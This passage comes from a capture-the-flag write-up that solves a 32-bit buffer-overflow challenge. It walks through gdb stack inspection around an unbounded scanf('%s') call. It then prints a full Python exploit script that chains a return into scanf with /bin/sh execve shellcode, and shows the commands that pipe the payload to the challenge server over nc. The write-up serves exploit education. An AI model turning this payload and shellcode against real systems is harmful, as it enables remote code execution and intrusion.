CALL my_func
would do something like

push ret_address
jmp my_func
```
Continue the program until the scanf breakpoint hits:
```
(gdb) c
Continuing.
=> 0x8049080 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804c020
0xffffd94c:	0x08049221	0x0804a0f7	0xffffd974	0x00000002
0xffffd95c:	0x080491c1	0x00010001	0x00381ea0	0x62808426
0xffffd96c:	0x62547333	0x004b6e41	0xffffd970	0xf7fdf289
0xffffd97c:	0x000000d5	0xf7dd9cb8	0x677f9a5f	0xf7fd0110

Breakpoint 1, 0x08049080 in __isoc99_scanf@plt ()
```

Examine the first three values of the stack:
```     
            %s
            v
0x08049221	0x0804a0f7	0xffffd974
^                       ^
return address          address to write to
```

`0x08049221` is the return address:
```
0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
0x8049221:	add    esp,0x10
^ 
this is the return address after the scanf call completes
```

`0x0804a0f7` is `%s`:
```
(gdb) x/s 0x0804a0f7
0x804a0f7:	"%s"
```

Check if %s is always at address: 0x804a0f7. Yes it is. According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 

`0xffffd974` is the location that scanf will write to. To confirm this, continue the program and check this memory location:
```
(gdb) x/s 0xffffd974
0xffffd974:	'A' <repeats 200 times>...
```

### New Section

Ok now alls left to do is mock up the stack in this same way, jump to scanf and execute the payload! 

First get the address of scanf, which we already have a breakpoint for:
```
0x08049080  __isoc99_scanf@plt
```

[script](exploit3.py)
```python
#!/usr/bin/python3
import struct

# mov al,0xff     0xb0 0xff
# sub al,0xf4     0x2c 0xf4
mov = b'\xb0\xff'
sub = b'\x2c\xf4'
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2'
shellcode += mov + sub + b'\xcd\x80\x31\xc0\x40\xcd\x80'

scanf = struct.pack("I", 0x08049080)
percentS = struct.pack("I", 0x0804a0f7)
payloadAddress = struct.pack("I", 0x0804c000)

payload = b'1 ' + b'A' * 1012 + b'BBBB' + scanf + payloadAddress + percentS + payloadAddress + b' ' + shellcode

with open("payload", "wb") as handle:
    handle.write(payload)
```

This is it. Run the payload in gdb. It works. Run it without gdb; don't forget to chain cat so that u can control the shell:
```
$ (cat payload; cat) | ./bank
``` 

Now run it on the challenge server:
```
$ (cat payload; cat) | nc challenges.laptophackingcoffee.org 2168
```

Submit the flag:
```
LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}
```

## Note to Self

Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020. It took nine (9) days of debugging, learning, and grinding to solve. This is my first buffer-overflow payload-to-shell exploit and I have learned a ton. This challenge involved an incredible amount of trial-and-error. However, the solution write-up skips *most* of these trials and instead focuses on the path to the goal. While the solution is important, it is the journey that makes it memorable and worthwhile. Happy hacking. 

## Resources
* [Wikipedia: scanf format string][1]
* [GeeksforGeeks: Difference between scanf() and gets() in C][2]
* [GDB Dashboard][3]
* [LiveOverflow: First Exploit! Buffer Overflow with Shellcode - bin 0x0E][4]
* [Shell Storm: Linux x86 execve("/bin/sh")][5]
* [StackOverflow: Assembly "leave" instruction][6]
* [StackOverflow: What is x86 "ret" instruction equivalent to?][7]
* [Wikipedia: X86 Assembly/X86 Architecture][8]
* [Wikipedia: Address Space Layout Randomization][9]
* [Sven Vermeulen: Binary Executable Security][10]
* [Debugging Session: Segmentation Fault Example][11]
* [StackOverflow: How to make the stack executable?][12]
* [StackOverflow: How to find the address of a string in memory using GDB?][13]
* [Sids Bits: Defeating ASLR With a Leak][14]
* [Julia Evans: How to get a core dump for a segfault on Linux][15]
* [Jacob Sorber: Debugging with Core Dumps][16]
* [CTF 101: Stack Canaries][17]
* [Checksum Error: Secrets of printf()][18]
* [Intrigano: Return Oriented Programming (ROP)][19]
* [Ahmed Demiai: Reversing Stripped ELF with GDB 64-Bit][20]
* [GeeksforGeeks: How to compile 32-bit program on 64-bit in C and C++][21]
* [StackOverflow: Substitutes for x86 assembly 'call' instruction?][22]

[1]:https://en.wikipedia.org/wiki/Scanf_format_string#Vulnerabilities
[2]:https://www.geeksforgeeks.org/difference-between-scanf-and-gets-in-c/
[3]:https://github.com/cyrus-and/gdb-dashboard
[4]:https://youtu.be/HSlhY4Uy8SA
[5]:http://shell-storm.org/shellcode/files/shellcode-811.php
[6]:https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
[7]:https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to
[8]:https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture
[9]:https://en.wikipedia.org/wiki/Address_space_layout_randomization
[10]:http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/
[11]:http://www.unknownroad.com/rtfm/gdbtut/gdbsegfault.html
[12]:https://stackoverflow.com/questions/29272431/how-to-make-the-stack-of-a-c-program-executable
[13]:https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb
[14]:https://sidsbits.com/Defeating-ASLR-with-a-Leak/
[15]:https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/
[16]:https://youtu.be/GV10eIuPs9k
[17]:https://ctf101.org/binary-exploitation/stack-canaries/
[18]:https://youtu.be/Y9kUWsyyChk
[19]:https://youtu.be/XZa0Yu6i_ew
[20]:https://youtu.be/pF_prX9ZEHg
[21]:https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
[22]:https://stackoverflow.com/questions/7060970/substitutes-for-x86-assembly-call-instruction